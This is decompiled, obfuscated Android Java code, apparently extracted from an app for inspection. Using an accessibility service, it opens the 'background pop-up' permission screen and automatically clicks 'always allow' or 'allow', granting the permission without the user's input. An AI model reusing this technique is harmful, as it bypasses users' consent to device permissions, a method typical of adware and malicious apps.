package com.acse.ottn.p042d.p044b;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityNodeInfo;
import com.acse.ottn.util.C1648S;
import com.acse.ottn.util.C1652V;
import com.acse.ottn.util.C1684n;
import com.acse.ottn.util.C1694ra;
import java.util.TimerTask;

/* renamed from: com.acse.ottn.d.b.s */
/* loaded from: E:\fuckcool\tsn\6276784.dex */
class C1516s implements C1648S.InterfaceC1649a {

    /* renamed from: a */
    final /* synthetic */ AccessibilityService f2794a;

    /* renamed from: b */
    final /* synthetic */ String f2795b;

    /* JADX INFO: Access modifiers changed from: package-private */
    public C1516s(AccessibilityService accessibilityService, String str) {
        this.f2794a = accessibilityService;
        this.f2795b = str;
    }

    @Override // com.acse.ottn.util.C1648S.InterfaceC1649a
    /* renamed from: a */
    public void mo55884a(long j) {
        C1684n m55975c;
        try {
            AccessibilityNodeInfo m55955g = C1684n.m55975c().m55955g(this.f2794a, "后台弹出界面");
            AccessibilityNodeInfo accessibilityNodeInfo = null;
            if (m55955g == null) {
                AccessibilityNodeInfo m55955g2 = C1684n.m55975c().m55955g(this.f2794a, this.f2795b);
                if (m55955g2 == null || m55955g2.getParent() == null || m55955g2.getParent().getParent() == null || m55955g2.getParent().getParent().getParent() == null) {
                    return;
                }
                for (int i = 0; i < m55955g2.getParent().getParent().getParent().getChildCount(); i++) {
                    if (m55955g2.getParent().getParent().getParent().getChild(i) != null && "androidx.recyclerview.widget.RecyclerView".equals(m55955g2.getParent().getParent().getParent().getChild(i).getClassName())) {
                        accessibilityNodeInfo = m55955g2.getParent().getParent().getParent().getChild(i);
                    }
                }
                C1684n.m55975c().m55978b(accessibilityNodeInfo);
                return;
            }
            TimerTask timerTask = C1517t.f2798c;
            if (timerTask != null) {
                timerTask.cancel();
                C1517t.f2798c = null;
            }
            C1684n.m55975c().m55958f(m55955g);
            C1684n.m55975c().m56005a(C1652V.m56140a().m56132b(500));
            AccessibilityNodeInfo m55955g3 = C1684n.m55975c().m55955g(this.f2794a, "始终允许");
            AccessibilityNodeInfo m55996a = C1684n.m55975c().m55996a(this.f2794a, "允许", true);
            if (m55955g3 != null) {
                C1684n.m55975c().m55958f(m55955g3);
                C1684n.m55975c().m56005a(C1652V.m56140a().m56132b(100));
                m55975c = C1684n.m55975c();
            } else if (m55996a == null) {
                return;
            } else {
                C1684n.m55975c().m55958f(m55996a);
                C1684n.m55975c().m56005a(C1652V.m56140a().m56132b(100));
                m55975c = C1684n.m55975c();
            }
            m55975c.m55969d(this.f2794a);
        } catch (Exception e) {
            C1694ra.m55917a("OnePlusUtils", "e =" + e.getMessage());
        }
    }

    @Override // com.acse.ottn.util.C1648S.InterfaceC1649a
    public void onFinish() {
        C1517t.f2798c = null;
    }
}
